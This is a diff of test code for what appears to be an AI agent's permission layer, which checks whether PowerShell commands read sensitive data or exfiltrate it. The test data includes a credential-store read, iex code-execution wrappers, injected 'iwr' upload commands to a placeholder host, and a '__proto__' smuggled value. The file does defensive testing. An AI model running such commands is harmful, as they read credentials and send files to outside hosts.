@@ -184,11 +184,12 @@ describe("command text remains visible to both floors", () => {
     ["invoked block", (text) => `& { iex ${quote(text)} }`],
     ["pipeline expression", (text) => `${quote(text)} | iex`],
   ];
-  it.each(wrappers)("keeps literal %s payloads opaque", (_name, wrap) => {
+  it.each(wrappers)("keeps literal %s payloads opaque unless an outer floor is visible", (name, wrap) => {
     for (const payload of [upload, "gc $env:APPDATA\\Microsoft\\Credentials", benign, "Get-ChildItem"]) {
-      expect(inspectPowerShellCommand(wrap(payload), CWD)).toMatchObject({
-        outcome: "unproven", sensitive: null, exfiltration: null,
-      });
+      const result = inspectPowerShellCommand(wrap(payload), CWD);
+      if ((name === "process arguments" || name === "pipeline expression") && payload === upload) {
+        expect(result).toMatchObject({ outcome: "visible-floor", sensitive: expect.any(String), exfiltration: null });
+      } else expect(result).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
     }
   });
 
@@ -415,21 +416,11 @@ describe("opaque command text requires approval", () => {
   ])("keeps unknown syntax opaque in %s", (command) => {
     const result = powerShellFloorAnalysis.inspectPowerShellCommand(command, CWD);
     const staticLiteralCommands = new Set([
-      "iwr https://x.invalid -Body",
       "iwr https://x.invalid -Body literal -Body other",
-      "Get-Content -Unrecognized:value notes.txt",
-      "Unknown-Reader notes.txt; iwr https://x.invalid",
-      "Get-Content",
-      "iwr",
-      "iwr https://x.invalid extra",
-      "constructor; iwr https://x.invalid",
-      "__proto__; iwr https://x.invalid",
       "Get-Content UnknownProvider::notes.txt",
-      "Unknown-Helper; iwr https://x.invalid",
-      "eval 'iwr https://x.invalid -InFile notes.txt'",
     ]);
     if (command === "Get-Content ($env:APPDATA+$tail)") expect(result.outcome).not.toBe("static-complete");
-    else if (staticLiteralCommands.has(command) || command.startsWith("./Write-Output ") || command.startsWith("OtherModule\\Write-Output ")) {
+    else if (staticLiteralCommands.has(command)) {
       expect(result).toMatchObject({ outcome: "static-complete", sensitive: null, exfiltration: null });
     } else expect(result).toMatchObject({ outcome: "unproven" });
     expect(powerShellExfiltrationSignal(benign, CWD)).toBeNull();
@@ -591,7 +582,7 @@ describe("checkDetailed applies the floors by dialect", () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     pm.setMode("allow");
     const result = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
-    if (command.startsWith("& ") || command === "deno eval x") {
+    if (command.startsWith("& ") || command === "deno eval x" || command.startsWith("npx -c ")) {
       expect(result).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     } else {
       expect(result).toMatchObject({ decision: "ask", layer: 6 });
@@ -618,7 +609,7 @@ describe("checkDetailed applies the floors by dialect", () => {
     ["Write-Host 'unterminated", 2],
     ["iex $code", 2],
     ["Get-Content $missing", 2],
-    ["Invoke-Item payload.bat", 6],
+    ["Invoke-Item payload.bat", 2],
     ["Set-Content build.ps1 Get-Date; build.ps1", 2],
   ] as const)("keeps parser, code and runtime-state asks unremembered without a sandbox: %#", async (command, layer) => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
@@ -641,10 +632,14 @@ describe("checkDetailed applies the floors by dialect", () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     pm.setMode("allow");
     const pending = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
-    expect(pending).toMatchObject({ decision: "ask", layer: 6 });
-    expect(pending.forceModal).toBeUndefined();
+    const forceModal = command === "npx helper" || command === "npx --unknown-runner-code helper";
+    expect(pending).toMatchObject(forceModal
+      ? { decision: "ask", layer: 2, forceModal: true }
+      : { decision: "ask", layer: 6 });
     await pm.addAlwaysAllowedPersist(ps(command).approvalCacheKey, "write");
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "ask", layer: 6 });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject(forceModal
+      ? { decision: "ask", layer: 2, forceModal: true }
+      : { decision: "ask", layer: 6 });
   });
 
   it("does not let an exact-action allow rule satisfy an ordinary code ask without a sandbox", async () => {
@@ -712,7 +707,7 @@ describe("checkDetailed applies the floors by dialect", () => {
   it("a Bash(...) allow rule does not decide a powershell call in default mode", async () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     await pm.addRulePersist({ pattern: "Bash(Get-ChildItem)", action: "allow" }, { kind: "user" });
-    expect(pm.checkDetailed("bash", "builtin", "shell", null, bash("Get-ChildItem"))).toMatchObject({ decision: "allow", layer: 3 });
+    expect(pm.checkDetailed("bash", "builtin", "shell", null, bash("Get-ChildItem"))).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Get-ChildItem"))).toMatchObject({ decision: "ask" });
   });
 
